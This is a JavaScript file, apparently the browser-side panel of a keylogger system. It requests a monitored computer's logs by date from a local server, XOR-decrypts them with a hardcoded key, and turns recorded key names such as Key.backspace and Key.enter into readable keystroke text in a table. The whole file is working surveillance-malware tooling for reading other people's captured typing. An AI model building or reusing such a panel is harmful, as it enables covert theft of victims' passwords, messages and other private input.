// Function to encrypt/decrypt data using XOR
function xorEncrypt(data) {
    let result = '';
    const key = "your_secure_secret_key"; // Secret key for XOR operation

    // Loop through each character of the data
    for (let i = 0; i < data.length; i++) {
        // Perform XOR between the character and the key
        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

// Function to decrypt hex-encoded encrypted data
function decrypt(encryptedHex) {
    let encryptedData = '';

    // Convert hexadecimal characters to text
    for (let i = 0; i < encryptedHex.length; i += 2) {
        encryptedData += String.fromCharCode(parseInt(encryptedHex.substr(i, 2), 16));
    }

    // Decrypt the data
    let decryptedData = xorEncrypt(encryptedData);

    // Replace key names with human-readable representations
    return decryptedData
        .replace(/Key\.space/g, ' ')
        .replace(/Key\.backspace/g, '[backspace]')
        .replace(/Key\.enter/g, '[enter]')
        .replace(/Key\.tab/g, '[tab]')
        .replace(/Key\.shift/g, '[shift]')
        .replace(/Key\.ctrl/g, '[ctrl]')
        .replace(/Key\.alt/g, '[alt]')
        .replace(/Key\.capslock/g, '[capslock]')
        .replace(/Key\.up/g, '[up]')
        .replace(/Key\.down/g, '[down]')
        .replace(/Key\.left/g, '[left]')
        .replace(/Key\.right/g, '[right]');
}

// Function to retrieve logs from the server based on the date
async function get_log(date) {
    let box = document.querySelector("#dataTable tbody"); // Cibler directement le tbody
    const urlParams = new URLSearchParams(window.location.search);
    const computer = urlParams.get("computer"); // Get the 'computer' parameter from the URL

    if (!computer) {
        console.error("No computer parameter found in URL"); // Check if the computer ID is present
        return;
    }

    try {
        // Perform a GET request to fetch logs for the selected date
        const response = await fetch(`http://127.0.0.1:5000/logs?computer_id=${computer}&date=${date}`, {
            method: "GET",
            credentials: "include" // Permet d'envoyer les cookies de session avec la requête
        });

        if (response.status === 404) {
            // Afficher un message si aucun log n'est trouvé
            box.innerHTML = ""; // Effacer le tableau avant d'ajouter le message
            const row = document.createElement("tr");
            const messageCell = document.createElement("td");
            messageCell.colSpan = 2; // Fusionner les colonnes pour afficher le message
            messageCell.innerText = "No logs found for this date."; // Message en anglais
            messageCell.style.textAlign = "center"; // Centrer le texte
            messageCell.style.color = "red"; // Changer la couleur du texte pour le rendre visible
            row.appendChild(messageCell);
            box.appendChild(row);
            return; // Sortir de la fonction si 404
        }

        if (!response.ok) {
            throw new Error("Failed to fetch data"); // Handle network errors
        }

        const data = await response.json();
        box.innerHTML = ""; // Clear the table before adding new data

        // Loop through each log entry and display it
        Object.entries(data.logs).forEach(([time, log]) => {
            const row = document.createElement("tr");

            const timeCell = document.createElement("td");
            timeCell.innerText = time; // Display the log time

            const logCell = document.createElement("td");
            const decryptedData = decrypt(log); // Decrypt the data
            logCell.innerText = decryptedData; // Display the logs in plain text

            row.appendChild(timeCell);
            row.appendChild(logCell);
            box.appendChild(row);
        });
    } catch (error) {
        console.error("Error fetching data:", error); // Handle request errors
    }
}

// Add an event listener when the page is fully loaded
document.addEventListener("DOMContentLoaded", () => {
    const dateInput = document.getElementById("searchInput");

    // Check if the input element exists
    if (!dateInput) {
        console.error("Element 'searchInput' not found.");
        return;
    }

    dateInput.addEventListener("change", (event) => {
        const date = event.target.value; // Get the selected date
        if (date) {
            get_log(date); // Retrieve logs for this date
        } else {
            console.error("Please select a date."); // Display an error message if the date is empty
        }
    });

    const searchForm = document.getElementById("searchDate");
    if (searchForm) {
        searchForm.addEventListener("submit", (event) => {
            event.preventDefault(); // Prevent the page from reloading
            const date = dateInput.value;
            if (date) {
                get_log(date);
            }
        });
    }
});
